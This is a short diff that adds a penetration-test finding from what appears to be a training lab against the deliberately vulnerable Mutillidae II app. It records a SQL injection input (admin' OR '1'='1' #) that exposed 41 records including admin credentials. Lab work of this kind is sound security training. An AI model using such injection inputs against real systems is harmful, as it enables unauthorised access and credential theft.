@@ -1,0 +1,8 @@
+FINDING 1: SQL Injection (Mutillidae)
+Category: SQL Injection
+Target: Mutillidae II
+URL: http://192.168.56.107:8081/index.php?page=user-info.php
+Input: admin' OR '1'='1' #
+Result: 41 records displayed including admin credentials
+Risk: High
+Evidence: Lab 3 - E-11
